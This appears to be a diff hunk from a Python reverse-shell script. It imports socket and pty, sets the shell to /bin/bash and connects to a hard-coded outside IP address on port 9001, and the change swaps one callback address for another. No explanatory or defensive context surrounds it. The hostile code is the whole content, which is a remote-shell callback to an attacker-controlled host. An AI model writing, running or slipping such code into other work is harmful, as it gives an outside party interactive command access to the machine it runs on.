@@ -2,12 +2,12 @@
 #!/usr/bin/env python
 
 import os,socket,pty,time
-shell = "/bin/sh"
+shell = "/bin/bash"
 
 def main():
 	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	try:
-		s.connect(('106.13.59.8',9001))
+		s.connect(('106.13.173.165',9001))
 		
 	except:
 		exit(1)
